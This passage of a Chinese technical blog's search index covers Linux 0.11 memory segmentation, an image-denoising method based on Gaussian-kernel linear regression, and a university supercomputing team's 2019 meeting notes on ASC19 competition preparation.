0\uff0c\u8fd9\u5c31\u662f\u201c\u5e73\u5766\u5185\u5b58\u6a21\u578b\u201d\uff0c\u8fd9\u6837\u5c31\u6709<code>\u6bb5\u5185\u504f\u79fb\u5730\u5740=\u903b\u8f91\u5730\u5740</code></p> <p>\u4e14\uff0c\u56db\u79cd\u6bb5\u5bf9\u5e94\u7684\u90fd\u4e3a GDT\u3002\u5373 Linux \u5927\u591a\u6570\u60c5\u51b5\u90fd\u4e0d\u4f7f\u7528 LDT\uff0c\u9664\u975e\u4f7f\u7528 wine \u7b49 Windows \u9632\u771f\u7a0b\u5e8f\u3002</p> <p>Linux 0.11 \u4e2d\u6bcf\u4e2a\u8fdb\u7a0b\u5212\u5206 64MB \u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u3002\u6545\u903b\u8f91\u5730\u5740\u8303\u56f4\u4e3a 0~0x4000000</p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/","title":"\u57fa\u4e8e 0-1 \u4e58\u6027\u566a\u58f0\u7684\u6734\u7d20\u56fe\u7247\u964d\u566a","text":"<p>AI Generated Abstract</p> <p>\u672c\u6587\u4ecb\u7ecd\u4e86\u4e00\u79cd\u57fa\u4e8e 0-1 \u4e58\u6027\u566a\u58f0\u7684\u56fe\u7247\u964d\u566a\u65b9\u6cd5\u3002\u901a\u8fc7\u5229\u7528\u56fe\u50cf\u50cf\u7d20\u7684\u5c40\u90e8\u76f8\u4f3c\u6027\u7279\u5f81\uff0c\u91c7\u7528\u9ad8\u65af\u6838\u51fd\u6570\u548c\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u5bf9\u53d7\u635f\u56fe\u50cf\u8fdb\u884c\u4fee\u590d\u3002\u6587\u4e2d\u8be6\u7ec6\u63cf\u8ff0\u4e86\u6838\u5fc3\u601d\u60f3\u3001\u8bad\u7ec3\u8fc7\u7a0b\u4ee5\u53ca\u8fed\u4ee3\u964d\u566a\u7b56\u7565\uff0c\u5e76\u5c55\u793a\u4e86\u5b9e\u9a8c\u7ed3\u679c\u548c\u6f5c\u5728\u4f18\u5316\u65b9\u5411\u3002\u8be5\u65b9\u6cd5\u5728\u89c6\u89c9\u6548\u679c\u4e0a\u53d6\u5f97\u4e86\u663e\u8457\u7684\u964d\u566a\u6548\u679c\uff0c\u540c\u65f6\u63d0\u51fa\u4e86\u5e76\u884c\u4f18\u5316\u548c\u66f4\u590d\u6742\u6a21\u578b\u7684\u6539\u8fdb\u5efa\u8bae\u3002</p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u9879\u76ee\u5185\u5bb9","title":"\u9879\u76ee\u5185\u5bb9","text":"<p>\u7ed9\u5b9a 3 \u5f20\u53d7\u635f\u56fe\u50cf\uff0c\u5c1d\u8bd5\u6062\u590d\u4ed6\u4eec\u7684\u539f\u59cb\u56fe\u50cf\u3002</p> <ol> <li>\u539f\u59cb\u56fe\u50cf\u5305\u542b 1 \u5f20\u9ed1\u767d\u56fe\u50cf\uff08A.webp\uff09\u548c 2 \u5f20\u5f69\u8272\u56fe\u50cf\uff08B.webp, C.webp\uff09\u3002</li> <li>\u53d7\u635f\u56fe\u50cf\\(X\\)\u662f\u7531\u539f\u59cb\u56fe\u50cf\\(I \\in R ^ { H * W * C }\\)\u6dfb\u52a0\u4e86\u4e0d\u540c\u566a\u58f0\u906e\u7f69\\(M \\in R ^ { H * W * C }\\)\u5f97\u5230\u7684\\(x=I \\odot m\\)\uff0c\u5176\u4e2d$ \\odot $\u662f\u9010\u5143\u7d20\u76f8\u4e58\u3002</li> <li>\u566a\u58f0\u906e\u7f69\u4ec5\u5305\u542b{0,1}\u503c\u3002\u5bf9\u5e94\u539f\u56fe\uff08A/B/C\uff09\u7684\u566a\u58f0\u906e\u7f69\u7684\u6bcf\u884c\u5206\u522b\u7528 0.8/0.4/0.6 \u7684\u566a\u58f0\u6bd4\u7387\u4ea7\u751f\u7684\uff0c\u5373\u566a\u58f0\u906e\u7f69\u6bcf\u4e2a\u901a\u9053\u6bcf\u884c 80%/40%/60% \u7684\u50cf\u7d20\u503c\u4e3a 0\uff0c\u5176\u4ed6\u4e3a 1\u3002</li> </ol> <p>\u8bc4\u4f30\u8bef\u5dee\u4e3a\u6062\u590d\u56fe\u50cf\u4e0e\u539f\u59cb\u56fe\u50cf\u5411\u91cf\u5316\u540e\u7684\u5dee\u5411\u91cf\u7684 2-\u8303\u6570\uff0c\u6b64\u8bef\u5dee\u8d8a\u5c0f\u8d8a\u597d\u3002</p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u5b9e\u73b0\u4ecb\u7ecd","title":"\u5b9e\u73b0\u4ecb\u7ecd","text":""},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u6838\u5fc3\u601d\u60f3","title":"\u6838\u5fc3\u601d\u60f3","text":"<p>\u7531\u4e8e\u56fe\u7247\u7684\u50cf\u7d20\u70b9\u5728\u7a7a\u95f4\u4e0a\u6ee1\u8db3\u5c40\u90e8\u76f8\u4f3c\u7684\u7279\u5f81\uff0c\u76f8\u90bb\u7684\u50cf\u7d20\u70b9\u901a\u9053\u503c\u53d8\u5316\u5f80\u5f80\u662f\u5e73\u6ed1\u4e14\u6709\u4e00\u5b9a\u89c4\u5219\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4e00\u4e2a\u6a21\u578b\u6765\u62df\u5408\u50cf\u7d20\u70b9\u901a\u9053\u503c\u5728\u7a7a\u95f4\u4e0a\u7684\u5173\u7cfb\u3002\u5177\u4f53\u5b9e\u73b0\u4e2d\uff0c\u6211\u4eec\u5c06\u56fe\u7247\u5207\u5272\u6210\u82e5\u5e72\u4e2a\u5c0f\u77e9\u5f62\u5757\uff0c\u7136\u540e\u4f7f\u7528\u4e00\u4e2a\u4e8c\u7ef4\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u6765\u56de\u5f52\u6bcf\u4e2a\u5c0f\u77e9\u5f62\u5757\u4e2d\u4f4d\u7f6e\u548c\u50cf\u7d20\u901a\u9053\u503c\u7684\u51fd\u6570\u5173\u7cfb\u3002\u4e3a\u4e86\u4f7f\u7ed3\u679c\u66f4\u52a0\u5e73\u6ed1\u548c\u53ef\u9760\uff0c\u6211\u4eec\u91c7\u7528\u4e86\u9ad8\u65af\u51fd\u6570\u4f5c\u4e3a\u57fa\u51fd\u6570\u3002</p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u9ad8\u65af\u51fd\u6570","title":"\u9ad8\u65af\u51fd\u6570","text":"<p>\u5f53\u6211\u4eec\u5bf9\u4e00\u4e2a ss * ss \u7684\u50cf\u7d20\u77e9\u9635\u5757\u505a\u56de\u5f52\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8981\u628a\u6240\u6709\u6ca1\u6709\u88ab\u566a\u97f3\u635f\u574f\u7684\u70b9\u90fd\u63d0\u53d6\u51fa\u6765\u3002\u70b9\u4f4d\u7f6e\u7528\u4e00\u4e2a\u9ad8\u65af\u6838\u51fd\u6570\u5904\u7406\uff0c\u8fd9\u6837\u539f\u6765\u7684\u70b9\u5750\u6807 (x,y) \u5c31\u88ab\u8f6c\u6362\u6210\u4e86\\((e^{-\\frac{(x-mid)^2}{2}},e^{-\\frac{(y-mid)^2}{2}})\\)\uff0c\u5728\u7279\u5f81\u7a7a\u95f4\u4e2d\u7528\u6765\u523b\u753b\u8fd9\u4e2a\u70b9\u4e0e\u77e9\u9635\u5757\u4e2d\u5fc3\u7684\u8ddd\u79bb\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5b9e\u9645\u8981\u56de\u5f52\u7684\u5c31\u662f\u70b9\u5fc3\u8ddd\u4e0e\u50cf\u7d20\u901a\u9053\u503c\u7684\u5173\u7cfb\u3002</p> <p>\u8fd9\u6837\u505a\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u6211\u4eec\u7684\u5c40\u90e8\u6027\u539f\u7406\u672c\u8eab\u5c31\u662f\u4e0d\u5e26\u65b9\u5411\u6027\u7684\uff0c\u6240\u8c13\u7684\u5c40\u90e8\u6027\u5c31\u662f\u6307\u4e34\u8fd1\u7684\u70b9\u5b58\u5728\u67d0\u79cd\u5e73\u6ed1\u7684\u53d8\u5316\u5173\u7cfb\u3002\u4f7f\u7528\u8fd9\u6837\u4e00\u4e2a\u8861\u91cf\u8ddd\u79bb\u7684\u6838\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u56de\u5f52\u7ed3\u679c\u66f4\u52a0\u5e73\u6ed1\uff1a</p> <p></p> <p>\u4e0a\u56fe\u5de6\u8fb9\u662f\u7528\u5750\u6807\u76f4\u63a5\u56de\u5f52\uff0c\u53f3\u56fe\u662f\u5750\u6807\u7ecf\u8fc7\u9ad8\u65af\u6838\u5904\u7406\u540e\u56de\u5f52\u7684\u7ed3\u679c\u3002\u53ef\u4ee5\u770b\u5230\u5de6\u8fb9\u6709\u5927\u91cf\u7684\u4e0d\u5e73\u6ed1\u7684\u4ea4\u9519\u7684\u9ed1\u767d\u70b9\uff0c\u770b\u8d77\u6765\u5f88\u201c\u810f\u201d\u3002\u53f3\u8fb9\u7531\u4e8e\u91c7\u7528\u4e86\u9ad8\u65af\u51fd\u6570\u5904\u7406\u8fc7\u7684\u8868\u5f81\u8ddd\u79bb\u5173\u7cfb\u7684\u6838\u51fd\u6570\uff0c\u7ed3\u679c\u66f4\u52a0\u5e73\u6ed1\uff0c\u6e05\u6670\u3002</p> <p>CODE :</p> <p></p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u8bad\u7ec3","title":"\u8bad\u7ec3","text":"<p>\u63d0\u53d6\u5b8c\u7279\u5f81\u540e\u7684\u6570\u636e\u70b9\u62df\u5408\uff0c\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u7ebf\u6027\u56de\u5f52\u4efb\u52a1\u800c\u5df2\uff0c\u6211\u4eec\u91c7\u7528\u6700\u5c0f\u4e8c\u4e58\u6cd5\u56de\u5f52\u3002 $$ Loss = \\frac {\\Sigma_{i=0}^n(y_i-\\phi(x_i) * w^T)^2}{n}=\\frac{\\Sigma_{i=1}^{n}Loss_i}{n} $$ \u4f7f\u7528\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6765\u6700\u4f18\u5316\u635f\u5931\u51fd\u6570\uff1a $$ w\\leftarrow w-\\eta * \\triangledown Loss_i=w+2\\eta(y_i-\\phi(x_i) * w^T) * \\phi(x_i) $$ \u5177\u4f53\u5b9e\u73b0\u4e2d\uff0c\u6211\u4eec\u53d6\u6b65\u957f=0.005\uff0c\u8fdb\u884c 100 \u8f6e\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u3002</p> <p>CODE :</p> <p></p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u8fed\u4ee3\u964d\u566a","title":"\u8fed\u4ee3\u964d\u566a","text":"<p>\u6211\u4eec\u524d\u9762\u63d0\u5230\u4e86\uff0c\u6211\u4eec\u8981\u628a\u56fe\u7247\u5207\u6210\u82e5\u5e72\u4e2a\u5c0f\u77e9\u5f62\u5757\uff0c\u5bf9\u6bcf\u4e2a\u5c0f\u77e9\u5f62\u5757\u5206\u522b\u8fdb\u884c\u56de\u5f52\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5c0f\u77e9\u5f62\u5757\u7684\u5c3a\u5bf8\u53d6\u591a\u5c11\u6bd4\u8f83\u5408\u9002\u5462\uff1f</p> <p>\u6211\u4eec\u5148\u53d6 ss=2 \u5c1d\u8bd5\u4e00\u4e0b\uff1a</p> <p></p> <p>\u566a\u97f3\u4e3a 0.8 \u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5982\u679c\u53d6\u4e00\u4e2a 2*2 \u7684\u5757\uff0c\u671f\u671b\u5176\u4e2d\u6ca1\u635f\u574f\u7684\u901a\u9053\u53ea\u6709 0.8 \u4e2a\uff0c\u6240\u4ee5\u52bf\u5fc5\u6709\u5927\u91cf\u7684\u77e9\u9635\u5757\u91cc\u9762\u90fd\u662f\u5168\u635f\u574f\u7684\uff0c\u8fd9\u4f1a\u4f7f\u5f97\u4e00\u4e9b\u5168\u635f\u574f\u7684\u5757\u5f97\u4e0d\u5230\u4fee\u590d\uff0c\u4ea7\u751f\u5927\u91cf\u7684\u9ed1\u70b9\u3002</p> <p>\u76f4\u63a5\u53d6 ss=5\uff1a</p> <p></p> <p>\u663e\u7136\uff0c\u9ed1\u5757\u7684\u6570\u91cf\u53d8\u5c11\u4e86\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u56fe\u7247\u7ed9\u4eba\u7684\u9897\u7c92\u8d76\u5f88\u660e\u663e\uff0c\u66f4\u50cf\u662f\u4e00\u5806\u6a21\u7cca\u7684\u9a6c\u8d5b\u514b\u62fc\u56fe\u62fc\u51d1\u800c\u6210\u7684\u3002</p> <p>\u6211\u4eec\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u5148\u53d6 ss=2\uff0c\u5bf9\u56fe\u7247\u505a\u6062\u590d\uff0c\u7136\u540e\u5c06\u6062\u590d\u7684\u56fe\u50cf\u518d\u7528\u66f4\u5927\u7684 ss \u6765\u6062\u590d\u3002</p> <p>\u4e0b\u9762\u662f\u7528 ss={2\uff0c3\uff0c4\uff0c5}\u8fed\u4ee3\u6062\u590d\u56db\u6b21\u7684\u8fc7\u7a0b\uff1a</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u9ed1\u70b9\u9010\u6e10\u88ab\u6d88\u9664\uff0c\u5e76\u4e14\u6700\u540e\u7ecf\u8fc7 ss=5 \u7684\u56de\u5f52\u540e\u5f97\u5230\u7684\u7ed3\u679c\u5728\u89c6\u89c9\u6548\u679c\u4e0a\u660e\u663e\u4f18\u4e8e\u76f4\u63a5\u7528 ss=5 \u8fdb\u884c\u56de\u5f52\u3002\u8fd9\u79cd\u60f3\u6cd5\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u8d2a\u5fc3\u7b97\u6cd5\u3002\u5148\u5c06\u635f\u5931\u5bc6\u5ea6\u5c0f\u7684\u5c40\u90e8\u5757\u6062\u590d\u597d\uff0c\u518d\u5145\u5206\u5229\u7528\u4e4b\u524d\u4fee\u590d\u51fa\u6765\u7684\u4fe1\u606f\u5c06\u635f\u5931\u5bc6\u5ea6\u66f4\u5927\u7684\u5757\u4fee\u590d\u3002</p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u5b9e\u9a8c\u7ed3\u679c","title":"\u5b9e\u9a8c\u7ed3\u679c","text":"<p>A (noise rate = 0.8)</p> <p></p> <p>B (noise rate = 0.4)</p> <p></p> <p>C (noise rate = 0.6)</p> <p></p> <p>D\uff08\u6839\u636e\u539f\u56fe\u81ea\u5df1\u751f\u6210\uff0c\u6d4b\u8bd5\u8fed\u4ee3\u8fc7\u7a0b\u4e2d\u635f\u5931\u7684\u51cf\u5c11\uff09</p> <p></p>"},{"location":"blog/2019/05/11/%E5%9F%BA%E4%BA%8E-0-1-%E4%B9%98%E6%80%A7%E5%99%AA%E5%A3%B0%E7%9A%84%E6%9C%B4%E7%B4%A0%E5%9B%BE%E7%89%87%E9%99%8D%E5%99%AA/#\u6f5c\u5728\u7684\u4f18\u5316\u5c55\u671b","title":"\u6f5c\u5728\u7684\u4f18\u5316\u5c55\u671b","text":"<ol> <li>\u7531\u4e8e\u6bcf\u4e2a\u5757\u7684\u4fee\u590d\u662f\u72ec\u7acb\u7684\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 CPU \u591a\u7ebf\u7a0b\u8ba1\u7b97\u6216\u8005\u5728 GPU \u4e0a\u7528 CUDA \u8fdb\u884c\u5e76\u884c\u4f18\u5316\uff0c\u52a0\u901f\u6574\u4e2a\u4fee\u590d\u8fc7\u7a0b\u3002</li> <li>\u4f7f\u7528\u66f4\u590d\u6742\u7684\u7f51\u7edc\u6765\u62df\u5408\u3002</li> <li>\u4f7f\u7528\u9a6c\u5c14\u79d1\u592b\u968f\u673a\u573a\u7684\u65b9\u6cd5\u6765\u505a\u56fe\u50cf\u964d\u566a\u3002</li> </ol>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/","title":"2019.05.26 \u4f1a\u8bae\u8bb0\u5f55","text":"<p>AI Generated Abstract</p> <p>\u672c\u7bc7\u535a\u5ba2\u603b\u7ed3\u4e86 2018-2019 \u5b66\u5e74\u6d59\u5927\u8d85\u7b97\u961f\u7684\u5de5\u4f5c\u60c5\u51b5\u4e0e ASC19 \u51b3\u8d5b\u89c2\u6469\u5b66\u4e60\u7684\u7ecf\u9a8c\u6559\u8bad\uff0c\u5206\u6790\u4e86\u56e2\u961f\u5728\u6bd4\u8d5b\u51c6\u5907\u3001\u786c\u4ef6\u7ef4\u62a4\u3001\u7b56\u7565\u5236\u5b9a\u7b49\u65b9\u9762\u7684\u4e0d\u8db3\uff0c\u5e76\u63d0\u51fa\u4e86\u6539\u8fdb\u5efa\u8bae\u3002\u540c\u65f6\uff0c\u535a\u5ba2\u8fd8\u5bf9\u8d85\u7b97\u961f\u7684\u76ee\u6807\u3001\u7ed3\u6784\u3001\u4efb\u52a1\u5206\u5de5\u53ca\u7ba1\u7406\u673a\u5236\u8fdb\u884c\u4e86\u68b3\u7406\uff0c\u65e8\u5728\u901a\u8fc7\u5174\u8da3\u9a71\u52a8\u548c\u77e5\u8bc6\u4f20\u627f\uff0c\u63a8\u52a8\u56e2\u961f\u7684\u6301\u7eed\u53d1\u5c55\u3002</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#2018-2019-\u5b66\u5e74\u603b\u7ed3","title":"2018-2019 \u5b66\u5e74\u603b\u7ed3","text":"<p>\u4f17\u6240\u5468\u77e5\u7684\uff0cASC19 \u6253\u7684\u4e0d\u592a\u7406\u60f3\uff0c\u521d\u8d5b\u6ca1\u6709\u51fa\u73b0\u3002\u8fd9\u4e00\u5e74\u6765\u6211\u4eec\u6709\u5f88\u591a\u65b0\u961f\u5458\u52a0\u5165\uff0c\u4e5f\u62a5\u540d\u53c2\u52a0\u8fc7\u6bd4\u8d5b\uff0c\u4f46\u662f\u4e00\u4e9b\u5de5\u4f5c\u4ecd\u7136\u505a\u5f97\u4e0d\u591f\u3002\u800c\u8fd9\u4e9b\u603b\u662f\u6709\u539f\u56e0\u7684\u3002</p> <p>\u8d85\u7b97\u961f\u51fa\u73b0\u8fc7\u65ad\u5c42\uff0c\u4e5f\u51fa\u73b0\u8fc7\u65b0\u7684\u7ba1\u7406\u5c42\u7684\u61c8\u6020\uff0c\u6240\u4ee5\u5bfc\u81f4\u8d85\u7b97\u961f\u6ca1\u6709\u8fd0\u4f5c\u8d77\u6765\uff0c\u4f5c\u4e3a\u5404\u4f4d\u6258\u4ed8\u7684\u4e34\u65f6\u7684 Leader\uff0c\u6211\u53d7\u4e4b\u6709\u6127\u3002\u8fd9\u4e00\u6b21\u89c2\u6469 ASC19 \u51b3\u8d5b\u7684\u8fc7\u7a0b\u4e2d\uff0c\u89c2\u6469\u5c0f\u7ec4\u7684\u4e00\u884c\u56db\u4eba (\u738b\u514b\u3001\u6c88\u97ec\u7acb\u3001\u5f20\u6587\u6377\u3001\u6f06\u7fd4\u5b87) \u4e0e\u4e0a\u4ea4\u7b49\u961f\u4f0d\u505a\u8fc7\u4ea4\u6d41\uff0c\u4e5f\u5b66\u4e60\u5230\u4e86\u5f88\u591a\u4e1c\u897f\uff0c\u6709\u5f88\u591a\u7684\u611f\u60f3\uff0c\u8fd9\u91cc\u505a\u4e00\u603b\u7ed3\u3002</p>"},{"location":"blog/2019/05/27/20190526-%E4%BC%9A%E8%AE%AE%E8%AE%B0%E5%BD%95/#asc19-\u51b3\u8d5b\u89c2\u6469\u5b66\u4e60\u5c0f\u7ed3","title":"ASC19 \u51b3\u8d5b\u89c2\u6469\u5b66\u4e60\u5c0f\u7ed3","text":"<ol> <li> <p>\u5728 ASC \u8d5b\u524d\uff0c\u53ef\u80fd\u6211\u4eec\u65b0\u961f\u5458\u90fd\u8ba4\u4e3a\u521d\u8d5b\u201c\u5212\u6c34\u201d\u5c31\u597d\uff0c\u4e0d\u9700\u8981\u63d0\u524d\u505a\u4ec0\u4e48\u51c6\u5907 \u2014\u2014 \u4f46\u5b9e\u9645\u4e0a\u6765\u770b\uff0c\u5373\u4fbf\u662f\u5728\u8d5b\u9898\u516c\u5e03\u4e4b\u524d\uff0c\u4e5f\u8981\u6709\u5f88\u591a\u51c6\u5907\uff0c\u8fd9\u79cd\u51c6\u5907\u662f\u77e5\u8bc6\u6280\u80fd\u4e0a\u7684\uff0c\u4e5f\u662f\u5404\u79cd\u9632\u8303\u4e0a\u7684\u3002</p> <ul> <li>\u5728\u521d\u8d5b\u51c6\u5907\u671f\u95f4\uff0cCluster \u96c6\u7fa4\u7684 IB \u4e00\u5ea6\u574f\u6389\uff0c\u5bfc\u81f4 HPL\u3001HPCG \u8dd1\u5206\u9047\u5230\u5f88\u5927\u7684\u74f6\u9888\uff0c\u76f4\u5230\u5f00\u5b66\u524d\u540e\u624d\u6709\u4eba\u6765\u6e2f\u4fee\u96c6\u7fa4\uff0c\u8fd9\u65f6\u518d\u60f3\u6253\u597d\u6bd4\u8d5b\u5df2\u7ecf\u4e0d\u5927\u53ef\u80fd\u4e86\u3002</li> <li>\u53e6\u5916\uff0c\u5e73\u65f6\u4e0d\u5728\u610f\u5982\u4f55\u914d\u7f6e HPL\u3001HPCG \u8fd9\u6837\u7684\u5fc5\u7528\u8f6f\u4ef6\u7684\u7f16\u8bd1\u53c2\u6570\u3001\u4e0d\u719f\u6089\u96c6\u7fa4\u7684\u7f16\u8bd1\u73af\u5883\uff0c\u4e5f\u5bfc\u81f4\u6bd4\u8d5b\u65f6\u7684\u624b\u5fd9\u811a\u4e71\u3002</li> </ul> </li> <li> <p>\u5373\u4fbf\u662f\u5728\u8d5b\u524d\u51c6\u5907\u5145\u5206\uff0c\u4e5f\u4e0d\u610f\u5473\u7740\u4e07\u65e0\u4e00\u5931\u3002\u8d5b\u573a\u4e0a\u53ef\u80fd\u4f1a\u9047\u5230\u5404\u79cd\u60c5\u51b5\uff0c\u6709\u5404\u79cd\u4e8b\u5148\u6ca1\u6709\u8003\u8651\u5230\u7684\u56e0\u7d20\u3002</p> <ul> <li>\u5c31\u6bd4\u5982\u4e00\u70b9\uff0c\u6e29\u5ea6\u3002\u6bd4\u8d5b\u73b0\u573a\u53ef\u80fd\u5b89\u6392\u5728\u4f1a\u8bae\u5ba4\u3001\u4f53\u80b2\u9986\u3001\u5c55\u89c8\u5927\u5385\uff0c\u53ef\u80fd\u6709\u597d\u7684\u901a\u98ce\u5236\u51b7\u4e5f\u53ef\u80fd\u6ca1\u6709\u3002\u5982\u679c\u73b0\u573a\u6ca1\u6709\u63d0\u4f9b\u4e00\u4e2a\u826f\u597d\u7684\u6052\u6e29\u73af\u5883\uff08\u57fa\u672c\u4e0d\u53ef\u80fd\uff09\uff0c\u5c31\u4f1a\u8003\u8651\u6e29\u5ea6\u53ca\u5176\u53d8\u5316\u5bf9\u96c6\u7fa4\u6027\u80fd\u548c\u529f\u7387\u7b56\u7565\u7684\u5f71\u54cd\u2014\u2014\u65e9\u8d77\u6e29\u5ea6\u8f83\u4f4e\uff0c\u4e2d\u5348\u6e29\u5ea6\u8f83\u9ad8\uff0c\u540c\u4e00\u4e2a\u9879\u76ee\u7684\u8dd1\u5206\u5c31\u4f1a\u4e0d\u540c\u3002\u4e00\u65e6\u6e29\u5ea6\u5347\u9ad8\uff0c\u98ce\u6247\u5c31\u4f1a\u5f00\u8d77\u6765\uff0c\u5403\u6389\u6570\u91cf\u53ef\u89c2\u7684\u529f\u7387\u3002</li> <li>\u53e6\u5916\u4e00\u70b9\uff0c\u5982\u679c\u73b0\u573a\u5e72\u71e5\uff0c\u8bbe\u5907\u4f1a\u51fa\u73b0\u5b58\u6709\u9759\u7535\u7684\u60c5\u51b5\u3002\u5f53\u73b0\u573a\u673a\u5668\u51fa\u73b0\u95ee\u9898\uff0c\u751a\u81f3\u8981\u62c6\u673a\u653e\u7535\u624d\u80fd\u6062\u590d\u8fd0\u884c\u3002\u8bbe\u5907\u968f\u65f6\u53ef\u80fd\u51fa\u73b0\u95ee\u9898\uff0c\u4e00\u65e6\u51fa\u73b0\u95ee\u9898\uff0c\u5c31\u9700\u8981\u4e0a\u624b\u4e0a\u5de5\u5177\uff0c\u751a\u81f3\u9700\u8981\u7528\u6700\u5feb\u7684\u901f\u5ea6\u6362\u65b0\u7684\u8bbe\u5907\u3002</li> </ul> </li> <li> <p>\u5e73\u65f6\u5728\u51c6\u5907\u4e0a\uff0c\u4e0d\u4ec5\u4ec5\u5e94\u5f53\u505c\u7559\u5728\u201c\u8f6f\u4ef6\u201d\u4e0a\u9762\uff0c\u66f4\u9700\u8981\u505a\u201c\u7cbe\u5de5\u5b9e\u4e60\u201d\u3001\u201c\u5de5\u7a0b\u8bad\u7ec3\u201d\uff0c\u9700\u8981\u6709\u4eba\u5b66\u4e60\u62c6\u88c5\u673a\uff0c\u5b66\u4e60\u786c\u4ef6\u7ef4\u62a4\uff0c\u5426\u5219\u9047\u5230\u8f6f\u4ef6\u65e0\u6cd5\u89e3\u51b3\u7684\u95ee\u9898\u4f1a\u5f88\u9ebb\u70e6\uff0c\u6d6a\u8d39\u5f88\u591a\u65f6\u95f4\u3002</p> </li> <li> <p>\u6bd4\u8d5b\u548c\u79d1\u7814\u4e0d\u540c\uff0c\u6bd4\u8d5b\u6709\u65f6\u95f4\u9650\u5236\uff0c\u53c2\u8d5b\u961f\u4f0d\u6709\u4eba\u6570\u548c\u80fd\u529b\u9650\u5236\uff0c\u518d\u52a0\u4e0a\u573a\u4e0a\u573a\u4e0b\u7684\u5404\u79cd\u7a81\u53d1\u60c5\u51b5\uff0c\u505a\u4e0d\u5b8c\u3001\u505a\u4e0d\u5230\u6700\u597d\u90fd\u662f\u53ef\u80fd\u53d1\u751f\u7684\u3002\u6240\u4ee5\u5728\u8d5b\u524d\u6211\u4eec\u5c31\u5e94\u5f53\u6709\u591a\u5957\u6bd4\u8d5b\u65b9\u6848\uff0c\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u6ce8\u91cd\u6bd4\u8d5b\u7684\u7b56\u7565\u2014\u2014\u6bd4\u8d5b\u7684\u5f97\u5206\u4f9d\u9760\u901a\u8fc7\u7684\u6d4b\u8bd5\u70b9\u6765\u5224\u5b9a\uff0c\u90a3\u4e48\u5148\u8dd1\u54ea\u4e9b\u70b9\u3001\u600e\u6837\u80fd\u591f\u83b7\u5f97\u6700\u591a\u7684\u5206\u6570\uff0c\u4e5f\u662f\u5f88\u91cd\u8981\u7684\u3002</p> </li> </ol> <p>\u8d85\u7b97\u7684\u6280\u672f\u6808\u662f\u5f88\u957f\u7684\uff0c\u6bcf\u5e74\u7684\u5e94\u7528\u6709\u5404\u4e2a\u65b9\u9762\u7684\uff0c\u800c\u8d85\u7b97\u4e5f\u9700\u8981\u8fd0\u7ef4\u3001\u7ef4\u4fee\u3001\u7f16\u8bd1\u3001\u4f18\u5316\u3001\u76d1\u63a7\u7b49\u5404\u4e2a\u65b9\u9762\u3002\u4f5c\u4e3a\u53c2\u8d5b\u8005\uff0c\u8981\u4e48\u8fd9\u4e9b\u90fd\u61c2\uff0c\u8981\u4e48\u5c31\u9700\u8981\u56e2\u961f\u6709\u660e\u786e\u7684\u5206\u5de5\u3001\u5404\u81ea\u6709\u64c5\u957f\u7684\u9886\u57df\u3002\u4eca\u5e74\u4e0a\u4ea4\u961f\u7684 Adviser 